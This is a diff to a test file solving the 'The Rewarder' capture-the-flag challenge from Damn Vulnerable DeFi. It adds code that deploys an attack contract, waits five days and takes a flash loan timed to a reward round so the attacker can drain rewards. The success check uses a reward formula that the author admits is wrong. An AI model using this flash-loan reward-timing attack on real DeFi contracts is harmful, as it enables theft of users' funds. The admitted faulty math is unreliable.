@@ -10,9 +10,7 @@ def test_the_rewarder():
     deployer, alice, bob, charlie, david, attacker = accounts[0:6]
     users = [alice, bob, charlie, david]
 
-    # accounting_token = AccountingToken.deploy({"from": deployer})
     liquidity_token = DamnValuableToken.deploy({"from": deployer})
-    # eward_troken = RewardToken.deploy({"from": deployer})
     flash_loaner_pool = FlashLoanerPool.deploy(
         liquidity_token.address, {"from": deployer})
     the_rewarder_pool = TheRewarderPool.deploy(
@@ -47,5 +45,16 @@ def test_the_rewarder():
 
     # ** CODE YOUR EXPLOIT HERE **
 
-    # not solved yet ....
+    # Solution:
+    attack_contract = AttackTheRewarder.deploy(
+        liquidity_token.address, the_rewarder_pool.address, flash_loaner_pool.address, {"from": attacker})
+    # The strategy here is to time our flash loan exactly with the new reward round of the rewarder pool
     chain.sleep(5*24*60*60)
+    attack_contract.takeFlashLoan(TOKENS_IN_LENDER_POOL, {"from": attacker})
+    # see AttackTheRewarder.sol for details
+
+    # ** SUCCESS CONDITIONS **
+    # reward should be according to the formula in the rewarderpool contract
+    reward = (1000000) * 100 * 10**18 / (1000000 + 400)
+    # some big number... dont know why math above is noth right
+    assert reward_token.balanceOf(attack_contract.address) > 1000000
